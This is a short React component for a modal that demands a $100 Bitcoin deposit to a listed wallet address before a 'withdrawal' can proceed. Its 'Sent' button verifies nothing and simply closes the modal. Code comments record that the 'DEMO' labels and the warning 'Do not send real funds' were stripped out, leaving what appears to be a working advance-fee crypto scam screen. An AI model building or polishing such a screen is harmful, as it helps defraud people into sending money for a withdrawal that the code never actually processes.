import React, { useState } from "react";

export default function PaymentModal({ onClose }) {
  // Demo Logic Removed:
  const [sent, setSent] = useState(false); // Can be kept or removed if not needed later

  function handleSent() {
    // Replaced demo logic with a placeholder that closes the modal
    console.log("Confirmed payment/withdrawal.");
    // alert("Thank you. You can now close this message."); // Removed alert
    onClose();
    // Removed setSent(true); and setTimeout() demo logic
  }

  return (
    <div className="modal-overlay">
      <div className="modal">
        <h3>Payment Required</h3> {/* Removed (DEMO) */}
        <p>
          To proceed with withdrawal, please deposit <b>$100</b> to the BTC wallet below.
        </p>
        <div className="btc-box">
          bc1q4c6f7xzsekkpvd2guwkaww4m7se9yjlrxnrjc7
        </div>
        <p className="warning"></p> {/* Removed DEMO ONLY — Do not send real funds */}
        <div className="btn-group">
          <button onClick={onClose}>Cancel</button>
          <button onClick={handleSent} className="btn-primary">
            Sent
          </button> {/* Removed (Demo) */}
        </div>
      </div>
    </div>
  );
}
